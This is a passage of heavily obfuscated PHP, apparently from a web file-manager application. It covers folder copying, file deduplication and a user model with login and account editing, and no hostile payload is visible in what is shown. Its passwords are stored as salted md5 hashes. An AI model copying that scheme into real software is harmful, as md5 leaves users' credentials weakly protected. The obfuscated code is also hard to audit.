$ùæ··âí, $¿À©ÌÕÅ, $≤¶õ›ÖÓ, $√«√û£˝, $¥Õƒ“”É = false) { $Í¬§ú¢º =& $_SERVER[ˆë€Ï⁄∂]; $àµ´ÜÑâ = array($Í¬§ú¢º[644] => array(), $Í¬§ú¢º[645] => array(), $Í¬§ú¢º[643] => array(), $Í¬§ú¢º[681] => array()); $–äÑ÷Ø° = $¥Õƒ“”É ? $¥Õƒ“”É : $ﬂÿ¸œÃƒ->pathThis($ùæ··âí); $¶µ∆•¯ò = $this->fileNameExist($¿À©ÌÕÅ, $–äÑ÷Ø°); $¸áû≥ïñ = $this->mkdir($¿À©ÌÕÅ, $–äÑ÷Ø°, $≤¶õ›ÖÓ); if (!$¶µ∆•¯ò || $≤¶õ›ÖÓ == REPEAT_RENAME_FOLDER) { $≤¶õ›ÖÓ = !1; } if ($¶µ∆•¯ò) { $this->_childrenAllMake($¶µ∆•¯ò); } Hook::trigger($Í¬§ú¢º[682]); $this->_copyChildTo($ﬂÿ¸œÃƒ, $ùæ··âí, $¸áû≥ïñ, $≤¶õ›ÖÓ, $àµ´ÜÑâ, $√«√û£˝); Hook::trigger($Í¬§ú¢º[683]); if ($¸áû≥ïñ) { $this->folderSizeResetChildren($¸áû≥ïñ); } $this->_childrenListClear(); Model($Í¬§ú¢º[646])->addAll($àµ´ÜÑâ[$Í¬§ú¢º[644]], array(), !0); Model($Í¬§ú¢º[647])->eventCopy($¸áû≥ïñ); $this->saveAll($àµ´ÜÑâ[$Í¬§ú¢º[645]]); Model($Í¬§ú¢º[555])->linkAdd($àµ´ÜÑâ[$Í¬§ú¢º[643]]); Model($Í¬§ú¢º[555])->remove($àµ´ÜÑâ[$Í¬§ú¢º[681]]); $this->folderSizeReset($¿À©ÌÕÅ); $this->updateModifyTime($¿À©ÌÕÅ); return $¸áû≥ïñ; } private function _copyChildTo($÷–’⁄ÁÇ, $üŸØÜ«Ó, $”‰£ïÈ¿, $ò¯˝êà⁄, &$˙ìÅü»¸, $≠‡¥∑Æñ) { $õíîçÿ£ =& $_SERVER[ˆë€Ï⁄∂]; $‰º§π÷È = $this->sourceInfoCache($”‰£ïÈ¿); $ÕïÙ≥“Õ = $÷–’⁄ÁÇ->listPath($üŸØÜ«Ó); $ÕïÙ≥“Õ = $ÕïÙ≥“Õ ? $ÕïÙ≥“Õ : array($õíîçÿ£[96] => array(), $õíîçÿ£[95] => array()); $£ΩÊø®¯ = array_merge($ÕïÙ≥“Õ[$õíîçÿ£[96]], $ÕïÙ≥“Õ[$õíîçÿ£[95]]); $…‡…⁄≈¨ = $this->_addFiles($÷–’⁄ÁÇ, $ÕïÙ≥“Õ[$õíîçÿ£[96]], $≠‡¥∑Æñ); $≥üãØ˚í = array(); foreach ($£ΩÊø®¯ as &$ø”†Ÿè) { if (isset($…‡…⁄≈¨[$ø”†Ÿè[$õíîçÿ£[32]]])) { $ø”†Ÿè = $…‡…⁄≈¨[$ø”†Ÿè[$õíîçÿ£[32]]]; } $ø”†Ÿè[$õíîçÿ£[496]] = $ø”†Ÿè[$õíîçÿ£[33]] == $õíîçÿ£[88]; $ø”†Ÿè[$õíîçÿ£[497]] = substr(_get($ø”†Ÿè, $õíîçÿ£[179], $õíîçÿ£[12]), 0, 10); $ø”†Ÿè[$õíîçÿ£[89]] = _get($ø”†Ÿè, $õíîçÿ£[89], 0); $ø”†Ÿè[$õíîçÿ£[552]] = _get($ø”†Ÿè, $õíîçÿ£[552], 0); if (!isset($ø”†Ÿè[$õíîçÿ£[684]]) && $ø”†Ÿè[$õíîçÿ£[552]]) { $˙ìÅü»¸[$õíîçÿ£[681]][] = $ø”†Ÿè[$õíîçÿ£[552]]; } if ($ò¯˝êà⁄) { $–∑á≥∑ô = $this->fileNameExistCache($”‰£ïÈ¿, $ø”†Ÿè[$õíîçÿ£[32]]); if ($–∑á≥∑ô) { if ($ø”†Ÿè[$õíîçÿ£[496]] || $ò¯˝êà⁄ == REPEAT_SKIP) { continue; } if ($ò¯˝êà⁄ == REPEAT_REPLACE) { $ı“≈â«∏ = $this->sourceInfoCache($–∑á≥∑ô); $äèÍâŒé = $this->fileHistory($ı“≈â«∏, $ø”†Ÿè[$õíîçÿ£[552]], $ø”†Ÿè[$õíîçÿ£[89]]); if ($äèÍâŒé) { $˙ìÅü»¸[$õíîçÿ£[643]][] = $ø”†Ÿè[$õíîçÿ£[552]]; } continue; } else { if ($ò¯˝êà⁄ == REPEAT_RENAME) { $ø”†Ÿè[$õíîçÿ£[32]] = $this->fileNameAutoCache($”‰£ïÈ¿, $ø”†Ÿè[$õíîçÿ£[32]], $ò¯˝êà⁄, !1); } } } } if (!$ø”†Ÿè[$õíîçÿ£[496]] && $ø”†Ÿè[$õíîçÿ£[552]] == 0) { continue; } if (!$ø”†Ÿè[$õíîçÿ£[496]] && $ø”†Ÿè[$õíîçÿ£[552]]) { $˙ìÅü»¸[$õíîçÿ£[643]][] = $ø”†Ÿè[$õíîçÿ£[552]]; } $≥üãØ˚í[] = $this->_makeItemData($ø”†Ÿè, $‰º§π÷È, $ø”†Ÿè[$õíîçÿ£[32]]); } unset($ø”†Ÿè); if (!empty($≥üãØ˚í)) { $this->addAll($≥üãØ˚í); $this->_childrenListSelect($”‰£ïÈ¿); } $ô”◊Ø†ƒ = $this->_childrenList($”‰£ïÈ¿); $ô”◊Ø†ƒ = array_to_keyvalue($ô”◊Ø†ƒ, $õíîçÿ£[32]); foreach ($£ΩÊø®¯ as $ø”†Ÿè) { $ı“≈â«∏ = $ô”◊Ø†ƒ[$ø”†Ÿè[$õíîçÿ£[32]]]; $ûì•˛Ô≈ = $ı“≈â«∏[$õíîçÿ£[203]]; $this->_copyApplyMeta($ı“≈â«∏, $˙ìÅü»¸); if ($ø”†Ÿè[$õíîçÿ£[33]] == $õíîçÿ£[88]) { $ø”†Ÿè[$õíîçÿ£[97]] = $÷–’⁄ÁÇ->getPathInner($ø”†Ÿè[$õíîçÿ£[97]]); $this->_copyChildTo($÷–’⁄ÁÇ, $ø”†Ÿè[$õíîçÿ£[97]], $ûì•˛Ô≈, $ò¯˝êà⁄, $˙ìÅü»¸, $≠‡¥∑Æñ); } } } private function _addFiles($≥ÙµèÜ‰, $öüâ•ÏÊ, $’ïÚÓ„≠) { $¶ﬁıàØﬁ =& $_SERVER[ˆë€Ï⁄∂]; if (!$öüâ•ÏÊ || count($öüâ•ÏÊ) == 0) { return array(); } $Áﬂ™Ë…Á = array(); foreach ($öüâ•ÏÊ as &$œË∫‚˜Ã) { Hook::trigger($¶ﬁıàØﬁ[685], $œË∫‚˜Ã); $œË∫‚˜Ã[$¶ﬁıàØﬁ[97]] = $≥ÙµèÜ‰->getPathInner($œË∫‚˜Ã[$¶ﬁıàØﬁ[97]]); $ı”∂ºÿ≠ = $≥ÙµèÜ‰->hashSimple($œË∫‚˜Ã[$¶ﬁıàØﬁ[97]]); $é•œºÚî = $≥ÙµèÜ‰->hashMd5($œË∫‚˜Ã[$¶ﬁıàØﬁ[97]]); if (strlen($é•œºÚî) > 10 && !isset($Áﬂ™Ë…Á[$é•œºÚî])) { $Áﬂ™Ë…Á[$é•œºÚî] = array(); } $œË∫‚˜Ã[$¶ﬁıàØﬁ[686]] = $ı”∂ºÿ≠; $œË∫‚˜Ã[$¶ﬁıàØﬁ[558]] = $é•œºÚî; $Áﬂ™Ë…Á[$é•œºÚî][] =& $œË∫‚˜Ã; if (count($Áﬂ™Ë…Á[$é•œºÚî]) > 1) { $œË∫‚˜Ã[$¶ﬁıàØﬁ[684]] = !0; } Hook::trigger($¶ﬁıàØﬁ[687], $œË∫‚˜Ã); } unset($œË∫‚˜Ã); $¸ÚÉúûë = array($¶ﬁıàØﬁ[558] => array($¶ﬁıàØﬁ[7], array_keys($Áﬂ™Ë…Á))); $∞ä£•Áñ = Model($¶ﬁıàØﬁ[688]); $û“÷˛®˛ = $∞ä£•Áñ->where($¸ÚÉúûë)->select(); $û“÷˛®˛ = $û“÷˛®˛ ? $û“÷˛®˛ : array(); foreach ($û“÷˛®˛ as $±€ÎÂ˙∂) { if (!isset($Áﬂ™Ë…Á[$±€ÎÂ˙∂[$¶ﬁıàØﬁ[558]]])) { continue; } $∞¸≈Áé… = $Áﬂ™Ë…Á[$±€ÎÂ˙∂[$¶ﬁıàØﬁ[558]]]; foreach ($∞¸≈Áé… as &$œË∫‚˜Ã) { $œË∫‚˜Ã[$¶ﬁıàØﬁ[552]] = $±€ÎÂ˙∂[$¶ﬁıàØﬁ[552]]; $œË∫‚˜Ã[$¶ﬁıàØﬁ[684]] = !0; } unset($œË∫‚˜Ã); } $»Ú¡ı Í = array(); foreach ($öüâ•ÏÊ as $â≥óõÇ†) { Hook::trigger($¶ﬁıàØﬁ[689], $â≥óõÇ†); if (isset($â≥óõÇ†[$¶ﬁıàØﬁ[684]]) && $â≥óõÇ†[$¶ﬁıàØﬁ[684]]) { Hook::trigger($¶ﬁıàØﬁ[690], $â≥óõÇ†); continue; } $–±⁄€ƒ≥ = $≥ÙµèÜ‰->getPathInner($â≥óõÇ†[$¶ﬁıàØﬁ[97]]); $à‡∆«åø = $∞ä£•Áñ->addFileMake($–±⁄€ƒ≥, $â≥óõÇ†[$¶ﬁıàØﬁ[89]], $â≥óõÇ†[$¶ﬁıàØﬁ[686]], $â≥óõÇ†[$¶ﬁıàØﬁ[558]], $â≥óõÇ†[$¶ﬁıàØﬁ[32]], $’ïÚÓ„≠); Hook::trigger($¶ﬁıàØﬁ[690], $â≥óõÇ†); if (!is_array($à‡∆«åø)) { continue; } $»Ú¡ı Í[] = $à‡∆«åø; } $∞ä£•Áñ->addAll($»Ú¡ı Í); $¸ÚÉúûë = array($¶ﬁıàØﬁ[558] => array($¶ﬁıàØﬁ[7], array_keys($Áﬂ™Ë…Á))); $û“÷˛®˛ = $∞ä£•Áñ->where($¸ÚÉúûë)->select(); $û“÷˛®˛ = $û“÷˛®˛ ? $û“÷˛®˛ : array(); foreach ($û“÷˛®˛ as $±€ÎÂ˙∂) { if (!isset($Áﬂ™Ë…Á[$±€ÎÂ˙∂[$¶ﬁıàØﬁ[558]]])) { continue; } $‰˛—¯§æ =& $Áﬂ™Ë…Á[$±€ÎÂ˙∂[$¶ﬁıàØﬁ[558]]]; foreach ($‰˛—¯§æ as &$œË∫‚˜Ã) { $œË∫‚˜Ã[$¶ﬁıàØﬁ[552]] = $±€ÎÂ˙∂[$¶ﬁıàØﬁ[552]]; } unset($œË∫‚˜Ã); } $¬Úë∂ﬂù = array(); foreach ($öüâ•ÏÊ as $—“‚´›Á) { $¬Úë∂ﬂù[$—“‚´›Á[$¶ﬁıàØﬁ[32]]] = $—“‚´›Á; } return $¬Úë∂ﬂù; } } define($_SERVER[ˆë€Ï⁄∂][691], $_SERVER[ˆë€Ï⁄∂][692]); goto E©ãŒ‡Ã‹ñ; FÊÉ·ÇÁüä: class UserModel extends ModelBase { protected $tableName = "\x75\x73\145\x72"; protected $tableMeta = array("\x74\141\142\154\x65\x4e\141\155\x65" => "\165\x73\x65\x72\137\155\x65\164\x61", "\x6d\x65\164\141\106\151\145\x6c\x64" => "\x75\x73\145\162\111\x44"); protected $simpleField = "\165\x73\x65\162\111\104\x2c\x6e\151\x63\x6b\116\141\155\145\x2c\x6e\141\x6d\x65\54\x61\166\x61\x74\141\162\54\x73\x65\x78\54\x73\x74\x61\x74\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($‘ºÌµ¿©) { $˚°˚Ï€« =& $_SERVER[ˆë€Ï⁄∂]; $ŸéØïÇ§ = $˚°˚Ï€«[2479]; return array($˚°˚Ï€«[2070] => array($‘ºÌµ¿©[0], $ŸéØïÇ§), $˚°˚Ï€«[2072] => array($‘ºÌµ¿©[0], $ŸéØïÇ§), $˚°˚Ï€«[2480] => array($‘ºÌµ¿©[0], $ŸéØïÇ§)); } protected function getInfo($áŒŒ‚¯°, $‡ƒŒ„¸å = false) { $ÍÕ†Ú‹» = $this->getInfoSimple($áŒŒ‚¯°); if (!is_array($ÍÕ†Ú‹»)) { return array(); } if ($‡ƒŒ„¸å) { return $this->_getInfoApply($ÍÕ†Ú‹»); } return $this->cacheFunctionGet($_SERVER[ˆë€Ï⁄∂][2074], $áŒŒ‚¯°); } protected function getInfoFull($˙‹Ì¢´‹, $ﬂ˛»éé„ = false) { $ïï”í¥” = $this->getInfoSimple($˙‹Ì¢´‹); if (!is_array($ïï”í¥”)) { return array(); } if ($ﬂ˛»éé„) { return $this->_getInfoApply($ïï”í¥”, !0); } return $this->cacheFunctionGet($_SERVER[ˆë€Ï⁄∂][2481], $˙‹Ì¢´‹); } private function _getInfoApply($±àé„èÖ, $¬°Ä∆÷µ = false) { $¥´‚€‘¯ =& $_SERVER[ˆë€Ï⁄∂]; if (!$±àé„èÖ) { return $±àé„èÖ; } $∂üÆ≠¸∏ = md5($¥´‚€‘¯[2482] . $±àé„èÖ[$¥´‚€‘¯[981]] . $¥´‚€‘¯[2483] . $±àé„èÖ[$¥´‚€‘¯[32]]); $±àé„èÖ = $this->_listDataApplyItem($±àé„èÖ); $ªÿÎ™¯Ù = Model($¥´‚€‘¯[1436])->metaGet($±àé„èÖ[$¥´‚€‘¯[100]][$¥´‚€‘¯[203]]); $±àé„èÖ[$¥´‚€‘¯[2484]] = $∂üÆ≠¸∏; $±àé„èÖ[$¥´‚€‘¯[100]][$¥´‚€‘¯[2273]] = isset($ªÿÎ™¯Ù[$¥´‚€‘¯[2274]]) ? $ªÿÎ™¯Ù[$¥´‚€‘¯[2274]] : null; if ($¬°Ä∆÷µ) { $±àé„èÖ[$¥´‚€‘¯[550]] = $this->metaGet($±àé„èÖ[$¥´‚€‘¯[1787]]); } return $±àé„èÖ; } protected function getInfoSimple($ﬂ”œƒ™Ã, $•·Å…Ì∂ = false) { $é÷•‡íö =& $_SERVER[ˆë€Ï⁄∂]; if (!$ﬂ”œƒ™Ã) { return array(); } if ($•·Å…Ì∂) { $≠è¢“…∞ = $this->where(array($é÷•‡íö[1787] => intval($ﬂ”œƒ™Ã)))->find(); if (!is_array($≠è¢“…∞)) { return array(); } $≠è¢“…∞[$é÷•‡íö[2485]] = Action($é÷•‡íö[2486])->parseUrl($≠è¢“…∞[$é÷•‡íö[2485]]); return $≠è¢“…∞; } return $this->cacheFunctionGet($é÷•‡íö[2075], $ﬂ”œƒ™Ã); } protected function getInfoSimpleOuter($≤ÉÏ¶ﬁœ) { $ÙÁ˛∑πı =& $_SERVER[ˆë€Ï⁄∂]; if (!$≤ÉÏ¶ﬁœ || $≤ÉÏ¶ﬁœ == 0) { return array($ÙÁ˛∑πı[1787] => $ÙÁ˛∑πı[240], $ÙÁ˛∑πı[32] => $ÙÁ˛∑πı[186] . LNG($ÙÁ˛∑πı[2487]) . $ÙÁ˛∑πı[188], $ÙÁ˛∑πı[2485] => STATIC_PATH . $ÙÁ˛∑πı[2488]); } $©Ü˘Öªÿ = $this->cacheFunctionGet($ÙÁ˛∑πı[2075], $≤ÉÏ¶ﬁœ); $¬¶©üı¨ = array_field_key($©Ü˘Öªÿ, explode($ÙÁ˛∑πı[50], $this->simpleField)); if (!$¬¶©üı¨) { return array($ÙÁ˛∑πı[1787] => $ÙÁ˛∑πı[1288], $ÙÁ˛∑πı[32] => $ÙÁ˛∑πı[186] . LNG($ÙÁ˛∑πı[2489]) . $ÙÁ˛∑πı[188], $ÙÁ˛∑πı[2485] => STATIC_PATH . $ÙÁ˛∑πı[2490]); } $¬¶©üı¨[$ÙÁ˛∑πı[2485]] = Action($ÙÁ˛∑πı[2486])->parseUrl($¬¶©üı¨[$ÙÁ˛∑πı[2485]]); return $¬¶©üı¨; } protected function groupUser($⁄◊Œ‘ê≈) { } public static function errorLang($ËÍ“”⁄ã) { $˜˝⁄óÆè =& $_SERVER[ˆë€Ï⁄∂]; $˙º„ôëƒ = array(self::ERROR_USER_NOT_EXISTS => $˜˝⁄óÆè[2491], self::ERROR_USER_PASSWORD_ERROR => $˜˝⁄óÆè[2492], self::ERROR_USER_EXIST_NAME => $˜˝⁄óÆè[2493], self::ERROR_USER_EXIST_PHONE => $˜˝⁄óÆè[2494], self::ERROR_USER_EXIST_EMAIL => $˜˝⁄óÆè[2495], self::ERROR_USER_LOGIN_LOCK => $˜˝⁄óÆè[2496], self::ERROR_IP_NOT_ALLOW => $˜˝⁄óÆè[2497], self::ERROR_USER_EXIST_NICKNAME => $˜˝⁄óÆè[2498]); $§—‚©Ïì = LNG($˙º„ôëƒ[$ËÍ“”⁄ã]); if ($ËÍ“”⁄ã == self::ERROR_USER_LOGIN_LOCK) { $Œ®‡ßó⁄ = (int) Model($˜˝⁄óÆè[2499])->get($˜˝⁄óÆè[2500]); if ($Œ®‡ßó⁄ > 60) { $§—‚©Ïì = str_replace($˜˝⁄óÆè[101], ceil($Œ®‡ßó⁄ / 60), $§—‚©Ïì); } } return $§—‚©Ïì; } protected function metaSet($¬≥ª€¸, $ôÃΩá√ˆ = null, $è‘…‘≠Ó = null) { $this->clearCache($¬≥ª€¸); return parent::metaSet($¬≥ª€¸, $ôÃΩá√ˆ, $è‘…‘≠Ó); } public function getInfoByMeta($•·˛È·Å, $ßœÆŒ’) { $Åâ ÖÏó =& $_SERVER[ˆë€Ï⁄∂]; $‘•ª˝›Œ = Model($Åâ ÖÏó[2501])->where(array($Åâ ÖÏó[107] => $•·˛È·Å, $Åâ ÖÏó[461] => $ßœÆŒ’))->find(); if ($‘•ª˝›Œ) { return $this->getInfo($‘•ª˝›Œ[$Åâ ÖÏó[1787]]); } return !1; } public function userLoginCheck($®á¸µÇ™, $¶´óÍ√û) { $°•ï¨À≤ =& $_SERVER[ˆë€Ï⁄∂]; $‚ó˘Â œ = $this->userLoginFind($®á¸µÇ™); if (!$‚ó˘Â œ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($‚ó˘Â œ[$°•ï¨À≤[1787]], $¶´óÍ√û)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($‚ó˘Â œ[$°•ï¨À≤[1787]]); } public function userLoginFind($Ú¥ÿöﬁ´) { $Ÿ¨…öóè =& $_SERVER[ˆë€Ï⁄∂]; $ôŸÛµ† = array($Ÿ¨…öóè[32] => $Ú¥ÿöﬁ´, $Ÿ¨…öóè[2286] => $Ú¥ÿöﬁ´, $Ÿ¨…öóè[391] => $Ú¥ÿöﬁ´, $Ÿ¨…öóè[2502] => $Ú¥ÿöﬁ´, $Ÿ¨…öóè[1092] => $Ÿ¨…öóè[1094]); if ($this->nickNameRpt()) { unset($ôŸÛµ†[$Ÿ¨…öóè[2286]]); } return $this->where($ôŸÛµ†)->find(); } public function clearCache($µöπãœ¢) { $¬∞éùÀ¨ =& $_SERVER[ˆë€Ï⁄∂]; $this->cacheFunctionClear($¬∞éùÀ¨[2074], $µöπãœ¢); $this->cacheFunctionClear($¬∞éùÀ¨[2075], $µöπãœ¢); $this->cacheFunctionClear($¬∞éùÀ¨[2481], $µöπãœ¢); } public function userPasswordCheck($ÄÆ Åã≥, $∏ÜÂÄÍÎ) { $Ÿ®Ì•—∫ =& $_SERVER[ˆë€Ï⁄∂]; $ë˛ÒÍÊ≥ = $this->where(array($Ÿ®Ì•—∫[1787] => intval($ÄÆ Åã≥)))->find(); $Ó›œÄäê = $this->metaGet($ÄÆ Åã≥); $ÏúÎñ¢¢ = isset($Ó›œÄäê[$Ÿ®Ì•—∫[2503]]) ? $Ó›œÄäê[$Ÿ®Ì•—∫[2503]] : $Ÿ®Ì•—∫[12]; if (md5($ÏúÎñ¢¢ . trim($∏ÜÂÄÍÎ)) !== $ë˛ÒÍÊ≥[$Ÿ®Ì•—∫[981]]) { return !1; } return !0; } public function userAdd($˘öúÿÆÇ) { $ë¿ê‡á⁄ =& $_SERVER[ˆë€Ï⁄∂]; $Èí∏û—… = array($ë¿ê‡á⁄[505] => $˘öúÿÆÇ[$ë¿ê‡á⁄[32]], $ë¿ê‡á⁄[2504] => $˘öúÿÆÇ[$ë¿ê‡á⁄[2198]], $ë¿ê‡á⁄[2505] => isset($˘öúÿÆÇ[$ë¿ê‡á⁄[391]]) ? $˘öúÿÆÇ[$ë¿ê‡á⁄[391]] : $ë¿ê‡á⁄[12], $ë¿ê‡á⁄[2506] => isset($˘öúÿÆÇ[$ë¿ê‡á⁄[2502]]) ? $˘öúÿÆÇ[$ë¿ê‡á⁄[2502]] : $ë¿ê‡á⁄[12], $ë¿ê‡á⁄[2507] => isset($˘öúÿÆÇ[$ë¿ê‡á⁄[2286]]) ? $˘öúÿÆÇ[$ë¿ê‡á⁄[2286]] : $˘öúÿÆÇ[$ë¿ê‡á⁄[32]], $ë¿ê‡á⁄[2508] => isset($˘öúÿÆÇ[$ë¿ê‡á⁄[2485]]) ? $˘öúÿÆÇ[$ë¿ê‡á⁄[2485]] : $ë¿ê‡á⁄[12], $ë¿ê‡á⁄[2509] => isset($˘öúÿÆÇ[$ë¿ê‡á⁄[2510]]) ? $˘öúÿÆÇ[$ë¿ê‡á⁄[2510]] : 1, $ë¿ê‡á⁄[2511] => $˘öúÿÆÇ[$ë¿ê‡á⁄[981]], $ë¿ê‡á⁄[2076] => isset($˘öúÿÆÇ[$ë¿ê‡á⁄[1974]]) ? $˘öúÿÆÇ[$ë¿ê‡á⁄[1974]] : 1024 * 1024 * 20, $ë¿ê‡á⁄[2077] => 0, $ë¿ê‡á⁄[2512] => 0, $ë¿ê‡á⁄[2121] => isset($˘öúÿÆÇ[$ë¿ê‡á⁄[841]]) ? $˘öúÿÆÇ[$ë¿ê‡á⁄[841]] : 1); if (!empty($˘öúÿÆÇ[$ë¿ê‡á⁄[1787]])) { $Èí∏û—…[$ë¿ê‡á⁄[1787]] = $˘öúÿÆÇ[$ë¿ê‡á⁄[1787]]; } $ˆÌ…˘™÷ = $this->_checkExist($˘öúÿÆÇ); if ($ˆÌ…˘™÷ !== !0) { return $ˆÌ…˘™÷; } if (!empty($Èí∏û—…[$ë¿ê‡á⁄[2485]]) && strlen($Èí∏û—…[$ë¿ê‡á⁄[2485]]) > 255) { $Èí∏û—…[$ë¿ê‡á⁄[2485]] = $ë¿ê‡á⁄[12]; } $≤áÑòó√ = $this->add($Èí∏û—…); $Æ÷Å“¢¢ = array($ë¿ê‡á⁄[2511] => $Èí∏û—…[$ë¿ê‡á⁄[981]], $ë¿ê‡á⁄[2507] => $Èí∏û—…[$ë¿ê‡á⁄[2286]]); $this->userEdit($≤áÑòó√, $Æ÷Å“¢¢); Model($ë¿ê‡á⁄[1436])->userRootAdd($≤áÑòó√); return $≤áÑòó√; } protected function userEditTest($ÌÅ±–ˆ–, $ü’∞ÔÇ¿) { return $this->call($_SERVER[ˆë€Ï⁄∂][2513], $ÌÅ±–ˆ–, $ü’∞ÔÇ¿); } protected function userEdit($åÌáäº¿, $È«é©®©) { $¥®‹“≈” =& $_SERVER[ˆë€Ï⁄∂]; $ßÆ◊‡ìø = $this->getInfoSimple($åÌáäº¿); if (!$ßÆ◊‡ìø) { return !1; } $…ﬁ‚ÊÙÙ = $this->_checkExist($È«é©®©, $åÌáäº¿); if ($…ﬁ‚ÊÙÙ !== !0) { return $…ﬁ‚ÊÙÙ; } if (isset($È«é©®©[$¥®‹“≈”[981]]) && trim($È«é©®©[$¥®‹“≈”[981]]) != $¥®‹“≈”[12]) { $ÓπÀË¸¢ = $this->metaGet($åÌáäº¿); if (empty($ÓπÀË¸¢[$¥®‹“≈”[2503]])) { $ÓπÀË¸¢[$¥®‹“≈”[2503]] = rand_string(10); Model($¥®‹“≈”[588])->metaSet($åÌáäº¿, $¥®‹“≈”[2503], $ÓπÀË¸¢[$¥®‹“≈”[2503]]); } $È«é©®©[$¥®‹“≈”[981]] = md5($ÓπÀË¸¢[$¥®‹“≈”[2503]] . trim($È«é©®©[$¥®‹“≈”[981]])); } else { unset($È«é©®©[$¥®‹“≈”[981]]); } if (!empty($È«é©®©[$¥®‹“≈”[2485]]) && strlen($È«é©®©[$¥®‹“≈”[2485]]) > 255) { $È«é©®©[$¥®‹“≈”[2485]] = $¥®‹“≈”[12]; } $this->where(array($¥®‹“≈”[1778] => $åÌáäº¿))->save($È«é©®©); if (isset($È«é©®©[$¥®‹“≈”[2286]])) { $this->setNamePinyin($åÌáäº¿, $È«é©®©[$¥®‹“≈”[2286]]); } $this->clearCache($åÌáäº¿); return !0; } public function setNamePinyin($ü∂°˘ÙÑ, $¢¡•≈”¥ = false) { $Âû¸’ä¶ =& $_SERVER[ˆë€Ï⁄∂]; if (!$¢¡•≈”¥) { $˝ÏÚêíÚ = $this->getInfoSimple($ü∂°˘ÙÑ); $¢¡•≈”¥ = $˝ÏÚêíÚ[$Âû¸’ä¶[2286]] ? $˝ÏÚêíÚ[$Âû¸’ä¶[2286]] : $˝ÏÚêíÚ[$Âû¸’ä¶[32]]; } $ÇºÑí«ö = Model($Âû¸’ä¶[608]); if (!Input::check($¢¡•≈”¥, $Âû¸’ä¶[669])) { return $ÇºÑí«ö->metaSet($ü∂°˘ÙÑ, array($Âû¸’ä¶[549] => $Âû¸’ä¶[12], $Âû¸’ä¶[548] => $Âû¸’ä¶[12])); } return $ÇºÑí«ö->metaSet($ü∂°˘ÙÑ, array($Âû¸’ä¶[549] => str_replace($Âû¸’ä¶[53], $Âû¸’ä¶[12], Pinyin::get($¢¡•≈”¥)), $Âû¸’ä¶[548] => Pinyin::get($¢¡•≈”¥, $Âû¸’ä¶[670]))); } private function nickNameRpt() { $†éÏê∞å =& $_SERVER[ˆë€Ï⁄∂]; $‘Ω◊ï⁄– = Model($†éÏê∞å[861])->get($†éÏê∞å[2514]); $∫∑…Ù›˛ = $GLOBALS[$†éÏê∞å[6]][$†éÏê∞å[468]][$†éÏê∞å[2514]]; $§áÓÌùù = !is_null($‘Ω◊ï⁄–) ? $‘Ω◊ï⁄– : $∫∑…Ù›˛; return !!$§áÓÌùù; } private function _checkExist($≥Æë∂òï, $≠˛©®˚≤ = false) { $í›¡õôá =& $_SERVER[ˆë€Ï⁄∂]; $ﬂúË˛ÍÊ = array($í›¡õôá[32] => UserModel::ERROR_USER_EXIST_NAME, $í›¡õôá[2286] => UserModel::ERROR_USER_EXIST_NICKNAME, $í›¡õôá[391] => UserModel::ERROR_USER_EXIST_EMAIL, $í›¡õôá[2502] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ﬂúË˛ÍÊ[$í›¡õôá[2286]]); } $‚Ôƒû…˝ = $≠˛©®˚≤ ? array($í›¡õôá[1787] => array($í›¡õôá[2515], $≠˛©®˚≤)) : array(); foreach ($ﬂúË˛ÍÊ as $Ñ„©Îªî => $áÜ˛˛Éπ) { $ÎÉ’„ˆ„ = array(); foreach ($ﬂúË˛ÍÊ as $Ö˘∑˝¢‹ => $ﬁ‰Á¿∂Ï) { if (isset($≥Æë∂òï[$Ö˘∑˝¢‹]) && $≥Æë∂òï[$Ö˘∑˝¢‹]) { $ÎÉ’„ˆ„[] = $≥Æë∂òï[$Ö˘∑˝¢‹]; } } if (!$ÎÉ’„ˆ„) { continue; } $‰®Ë†ı› = array_merge(array($Ñ„©Îªî => array($í›¡õôá[7], $ÎÉ’„ˆ„)), $‚Ôƒû…˝); $ËÅèËﬂë = $this->where($‰®Ë†ı›)->find(); if ($ËÅèËﬂë) { return $áÜ˛˛Éπ; } } return !0; } public function userListInfo($±ØÙÃŸú) { $…ø˝‰…© =& $_SERVER[ˆë€Ï⁄∂]; $ºú”«Ëõ = array(); $±ØÙÃŸú = is_array($±ØÙÃŸú) ? array_unique($±ØÙÃŸú) : array(); if (!$±ØÙÃŸú) { return $ºú”«Ëõ; } if (count($±ØÙÃŸú) < 20) { foreach ($±ØÙÃŸú as $ôà·Ø˙ó) { $ºú”«Ëõ[$ôà·Ø˙ó . $…ø˝‰…©[12]] = $this->getInfoSimpleOuter($ôà·Ø˙ó); } } else { $ò÷Òƒ÷Ω = array($…ø˝‰…©[1778] => array($…ø˝‰…©[503], $±ØÙÃŸú)); if (count($±ØÙÃŸú) == 1) { $ò÷Òƒ÷Ω = array($…ø˝‰…©[1778] => $±ØÙÃŸú[0]); } $û©◊Ó∞ä = Model($…ø˝‰…©[588])->field($this->simpleField)->where($ò÷Òƒ÷Ω)->select(); $û©◊Ó∞ä = array_to_keyvalue($û©◊Ó∞ä, $…ø˝‰…©[1787]); foreach ($±ØÙÃŸú as $ôà·Ø˙ó) { $®ÇàòÑô = $û©◊Ó∞ä[$ôà·Ø˙ó]; if (!$®ÇàòÑô) { $ºú”«Ëõ[$ôà·Ø˙ó . $…ø˝‰…©[12]] = $this->getInfoSimpleOuter($ôà·Ø˙ó); continue; } $®ÇàòÑô[$…ø˝‰…©[2485]] = Action($…ø˝‰…©[2486])->parseUrl($®ÇàòÑô[$…ø˝‰…©[2485]]); $ºú”«Ëõ[$ôà·Ø˙ó . $…ø˝‰…©[12]] = $®ÇàòÑô; } } return $ºú”«Ëõ; } protected function userStatus($ àﬁõΩ∫, $Ñ†ªõŸ–) { $–€ÜâáΩ = $this->getInfoSimple($ àﬁõΩ∫); if (!$–€ÜâáΩ) { return !1; } $€πúŒ±· = array($_SERVER[ˆë€Ï⁄∂][841] => $Ñ†ªõŸ–); return $this->userEdit($ àﬁõΩ∫, $€πúŒ±·); } protected function userRemove($÷Ë˜ËÍ‰) { $àÂùê¶‘ =& 